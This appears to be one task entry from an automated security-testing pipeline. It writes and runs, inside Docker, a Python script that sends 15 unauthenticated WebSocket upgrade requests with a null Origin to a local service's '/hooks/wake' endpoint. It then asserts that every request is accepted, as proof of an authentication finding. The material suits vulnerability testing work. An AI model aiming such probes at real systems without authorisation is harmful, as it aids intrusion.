  - id: "1.5"
    title: "Run Docker focused WebSocket repro"
    gate: "A proof candidate is not a successful hack until a focused Docker repro artifact exists."
    lane: "1"
    runner: local
    depends_on: ["1.3"]
    cwd: /home/graham/workspace/experiments/agent-skills
    skills: [hack]
    command: |-
      set -euo pipefail
      RUN_ROOT=$(cat /tmp/hack-openclaw-weakspot-run-root.txt)
      EVOLVE_DIR=$(ls -td "$RUN_ROOT"/evolve-campaign-*-127.0.0.1-18789 | head -1)
      mkdir -p "$EVOLVE_DIR/proof-candidates"
      PROOF_SCRIPT="$RUN_ROOT/focused_websocket_repro.py"
      cat > "$PROOF_SCRIPT" <<'PY'
      import base64, hashlib, json, os, socket, time
      host='127.0.0.1'; port=18789; path='/hooks/wake'; total=15
      runs=[]; last_request=b''
      for idx in range(total):
          key=base64.b64encode(os.urandom(16)).decode()
          req=(f'GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\nOrigin: null\r\n\r\n').encode()
          last_request=req
          started=time.time(); status_line=''; accepted=False; error=None
          try:
              with socket.create_connection((host, port), timeout=5) as sock:
                  sock.sendall(req)
                  data=sock.recv(4096)
                  status_line=data.split(b'\r\n', 1)[0].decode('latin1', 'replace') if data else ''
                  accepted=status_line.startswith('HTTP/1.1 101') or status_line.startswith('HTTP/1.0 101')
          except Exception as exc:
              error=f'{type(exc).__name__}: {exc}'
          runs.append({'index':idx,'status_line':status_line,'accepted':accepted,'error':error,'elapsed_ms':round((time.time()-started)*1000,2)})
      accepted_runs=sum(1 for row in runs if row['accepted'])
      payload={'schema':'hack.focused_repro.websocket.v1','target':'http://127.0.0.1:18789','path':path,'auth_state':'unauthenticated','origin':'null','total_runs':total,'accepted_runs':accepted_runs,'rejected_runs':total-accepted_runs,'pass':accepted_runs == total,'observed_signal':'HTTP 101 Switching Protocols' if accepted_runs else 'no accepted websocket upgrades','raw_request_sha256':hashlib.sha256(last_request).hexdigest(),'runs':runs}
      print(json.dumps(payload, indent=2))
      PY
      docker run --rm --network host -v "$PROOF_SCRIPT:/repro.py:ro" python:3.11-slim python /repro.py > "$EVOLVE_DIR/proof-candidates/hooks-wake-websocket-repro.json"
      python3 - <<'PY'
      import json, pathlib
      root=pathlib.Path(pathlib.Path('/tmp/hack-openclaw-weakspot-run-root.txt').read_text().strip())
      ev=sorted(root.glob('evolve-campaign-*-127.0.0.1-18789'))[-1]
      proof=json.loads((ev/'proof-candidates'/'hooks-wake-websocket-repro.json').read_text())
      assessment={'status':'focused_repro_created','proof_artifact':str(ev/'proof-candidates'/'hooks-wake-websocket-repro.json'),'accepted_runs':proof['accepted_runs'],'total_runs':proof['total_runs'],'pass':proof['pass']}
      (root/'focused-repro-assessment.json').write_text(json.dumps(assessment, indent=2)+'\n')
      assert proof['accepted_runs'] == proof['total_runs'], assessment
      print(json.dumps(assessment, indent=2))
      PY
    tests:
      - "python3 - <<'PY'\nimport json, pathlib; root=pathlib.Path('/tmp/hack-openclaw-weakspot-run-root.txt').read_text().strip(); d=json.loads((pathlib.Path(root)/'focused-repro-assessment.json').read_text()); assert d['accepted_runs'] == d['total_runs'] == 15\nPY"
    definition_of_done:
      command: "python3 - <<'PY'\nimport json, pathlib; root=pathlib.Path('/tmp/hack-openclaw-weakspot-run-root.txt').read_text().strip(); d=json.loads((pathlib.Path(root)/'focused-repro-assessment.json').read_text()); assert d['pass'] is True; print(d['proof_artifact'])\nPY"
      assertion: "A Docker-contained focused proof artifact confirms the promoted WebSocket finding."

